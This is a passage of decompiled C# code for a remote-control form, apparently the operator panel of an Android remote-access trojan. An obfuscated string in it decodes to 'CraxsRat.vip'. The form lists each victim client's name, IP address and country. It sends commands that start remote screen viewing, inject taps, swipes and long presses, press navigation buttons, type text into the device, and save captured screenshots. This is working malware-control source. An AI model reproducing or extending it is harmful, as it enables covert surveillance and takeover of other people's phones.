		this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
		this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
		this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9f);
		this.clinameinfo.ForeColor = System.Drawing.Color.SkyBlue;
		this.clinameinfo.Location = new System.Drawing.Point(32, 0);
		this.clinameinfo.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.clinameinfo.Name = "clinameinfo";
		this.clinameinfo.Size = new System.Drawing.Size(356, 29);
		this.clinameinfo.TabIndex = 12;
		this.clinameinfo.Text = "...";
		this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
		this.ClientPic.Location = new System.Drawing.Point(0, 0);
		this.ClientPic.Margin = new System.Windows.Forms.Padding(2, 3, 2, 3);
		this.ClientPic.Name = "ClientPic";
		this.ClientPic.Size = new System.Drawing.Size(32, 29);
		this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.ClientPic.TabIndex = 11;
		this.ClientPic.TabStop = false;
		this.keyboardpanel.Controls.Add(this.textsend);
		this.keyboardpanel.Controls.Add(this.DrakeUIAvatar2);
		this.keyboardpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.keyboardpanel.Location = new System.Drawing.Point(0, 0);
		this.keyboardpanel.Margin = new System.Windows.Forms.Padding(2);
		this.keyboardpanel.Name = "keyboardpanel";
		this.keyboardpanel.Size = new System.Drawing.Size(388, 28);
		this.keyboardpanel.TabIndex = 7;
		this.keyboardpanel.Tag = "b";
		this.textsend.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.textsend.Dock = System.Windows.Forms.DockStyle.Fill;
		this.textsend.FillColor = System.Drawing.Color.Black;
		this.textsend.Font = new System.Drawing.Font("Calibri", 12f);
		this.textsend.ForeColor = System.Drawing.Color.SkyBlue;
		this.textsend.Location = new System.Drawing.Point(0, 0);
		this.textsend.Margin = new System.Windows.Forms.Padding(4);
		this.textsend.Maximum = 2147483647.0;
		this.textsend.Minimum = -2147483648.0;
		this.textsend.Name = "textsend";
		this.textsend.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.textsend.Radius = 10;
		this.textsend.RectColor = System.Drawing.Color.SkyBlue;
		this.textsend.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.textsend.Size = new System.Drawing.Size(354, 27);
		this.textsend.Style = DrakeUI.Framework.UIStyle.Custom;
		this.textsend.StyleCustomMode = true;
		this.textsend.TabIndex = 46;
		this.textsend.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.textsend.Watermark = "Enter Text";
		this.buttompanel.Controls.Add(this.ctrlpanel);
		this.buttompanel.Controls.Add(this.keyboardpanel);
		this.buttompanel.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.buttompanel.Location = new System.Drawing.Point(0, 642);
		this.buttompanel.Margin = new System.Windows.Forms.Padding(2);
		this.buttompanel.Name = "buttompanel";
		this.buttompanel.Size = new System.Drawing.Size(388, 28);
		this.buttompanel.TabIndex = 8;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 12f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(388, 670);
		base.Controls.Add(this.hidetoolbtn);
		base.Controls.Add(this.buttompanel);
		base.Controls.Add(this.viewpic);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel3);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "ScreenReaderV3";
		this.Text = "ScreenReaderV3";
		this.Panel2.ResumeLayout(false);
		this.ctrlpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viewpic).EndInit();
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
		this.keyboardpanel.ResumeLayout(false);
		this.buttompanel.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public ScreenReaderV2()
	{
		base.Load += ScreenReaderV2_Load;
		base.FormClosing += ScreenReaderV2_FormClosing;
		isclick = false;
		Swaping = false;
		isdown = false;
		ScreenShotFoucs = false;
		Recordit = false;
		Rnew = 0;
		Title = "null";
		tiks = 0;
		InitializeComponent();
	}

	private void ScreenReaderV2_Load(object sender, EventArgs e)
	{
		try
		{
			ClientPic.Image = classClient.Wallpaper;
			clinameinfo.Text = "Name: " + classClient.ClientName + Strings.Space(2) + "IP: " + classClient.ClientAddressIP + Strings.Space(2) + "Country: " + classClient.Country;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ShowTipform showTipform = new ShowTipform(RegistryHandler.ShowScrenReadTip, Resources.Tip_screenctrol);
		string text = RegistryHandler.GET_Tip(RegistryHandler.ShowScrenReadTip);
		bool flag = true;
		if (text != null)
		{
			if (Operators.CompareString(text, "no", TextCompare: false) == 0)
			{
				flag = false;
			}
		}
		else
		{
			flag = true;
		}
		if (flag)
		{
			showTipform.ShowDialog();
		}
	}

	private void Savetimer_Tick(object sender, EventArgs e)
	{
	}

	private void Save_MouseClick(object sender, MouseEventArgs e)
	{
		if (Save.Checked)
		{
			Timer1.Start();
		}
		else
		{
			Timer1.Stop();
		}
	}

	private void Presstimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			tiks++;
		}
	}

	public string asab(string input)
	{
		string[] array = input.Replace("\u200b", " ").Split(' ');
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Length > 0)
			{
				text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
			}
		}
		return text;
	}

	private void Enablebtn_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			TcpClient myClient = classClient.myClient;
			string[] array = classClient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			if (Operators.CompareString(MyProject.Forms.Ports.Label3.Text, asab("67\u200b114\u200b97\u200b120\u200b115\u200b82\u200b97\u200b116\u200b46\u200b118\u200b105\u200b112"), TextCompare: false) == 0)
			{
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>o" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			enablebtn.Enabled = false;
			disablebtn.Enabled = true;
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		viewpic.Image = Codes.BlankImage();
	}

	private void Disablebtn_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			TcpClient myClient = classClient.myClient;
			string[] array = classClient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
			enablebtn.Enabled = true;
			disablebtn.Enabled = false;
		}
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					classClient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					classClient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					classClient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Livepicbox_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private void Livepicbox_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private void Livepicbox_MouseMove(object sender, MouseEventArgs e)
	{
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		ScreenShotFoucs = false;
		if (e.Button == MouseButtons.Left)
		{
			Trakpoint = new List<Point>();
			Trakpoint.Add(new Point(e.X, e.Y));
			isclick = false;
			isdown = true;
		}
		else
		{
			presstimer.Enabled = true;
			isclick = true;
		}
	}

	private void Viewpic_MouseMove(object sender, MouseEventArgs e)
	{
		if (isdown)
		{
			Swaping = true;
			isclick = false;
			Trakpoint.Add(new Point(e.X, e.Y));
		}
	}

	private void Viewpic_MouseUp(object sender, MouseEventArgs e)
	{
		isdown = false;
		int num = viewpic.Width;
		int num2 = viewpic.Height;
		checked
		{
			if (!isclick)
			{
				if (!Swaping)
				{
					return;
				}
				Swaping = false;
				Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point item in Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round((double)item.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)item.Y * ((double)ScreenSize.Height / (double)num2))).ToString() + ":");
				}
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + stringBuilder.ToString() + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
				return;
			}
			presstimer.Enabled = false;
			presstimer.Stop();
			string text = "clk:";
			if (tiks > 3)
			{
				text = "clk:hold:";
			}
			tiks = 0;
			Point point = viewpic.PointToClient(Control.MousePosition);
			Point point2 = new Point((int)Math.Round((double)point.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)point.Y * ((double)ScreenSize.Height / (double)num2)));
			text = text + point2.X + ":" + point2.Y;
			string[] array2 = classClient.Keys.Split(':');
			object[] parametersObjects2 = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects2);
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = DownloadsFolder + "\\Screen_ReaderV_2";
			if (Save.Checked)
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				if (Directory.Exists(text))
				{
					viewpic.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
				}
			}
			else
			{
				savetimer.Stop();
				savetimer.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ScreenReaderV2_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (classClient != null)
		{
			TcpClient myClient = classClient.myClient;
			string[] array = classClient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
			enablebtn.Enabled = true;
			disablebtn.Enabled = false;
		}
	}

	private void Hidetoolbtn_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(keyboardpanel.Tag, "b", TextCompare: false))
		{
			keyboardpanel.Tag = "f";
			keyboardpanel.BringToFront();
		}
		else
		{
			keyboardpanel.SendToBack();
			keyboardpanel.Tag = "b";
		}
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (classClient != null && textsend.Text.Length > 0)
		{
			object[] parametersObjects = new object[4]
			{
				classClient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pst<*>" + textsend.Text + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
			textsend.Text = "";
		}
	}

	private void DrakeUIAvatar1_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					classClient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>En" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
